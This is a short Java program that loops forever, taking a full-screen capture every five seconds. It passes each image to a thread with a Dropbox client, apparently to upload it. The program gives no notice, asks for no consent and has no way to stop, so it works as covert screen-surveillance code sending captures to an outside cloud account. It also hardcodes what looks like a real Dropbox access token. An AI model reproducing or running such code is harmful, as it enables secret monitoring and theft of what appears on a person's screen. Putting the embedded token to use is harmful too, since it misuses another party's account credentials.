import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.FileInputStream;
import java.io.InputStream;

public class MAIN {
    public static void main(String[] args) throws InterruptedException {
        final String ACCESS_TOKEN = "Aawocl-y8YcAAAAAAAAAAZlrNZJpz0GyIB23qUUYQYuPxhAdsTUo8LEiHQE9X4_a";
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
      for (;;) {
          try{
          Robot robot = new Robot();
          Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
          BufferedImage screenFullImage = robot.createScreenCapture(screenRect);
              MyThread thread = new MyThread(client, screenFullImage);
              thread.start();
              Thread.sleep(5000);
          } catch (Exception exception) {
              exception.printStackTrace();
          }
      }



    }
}
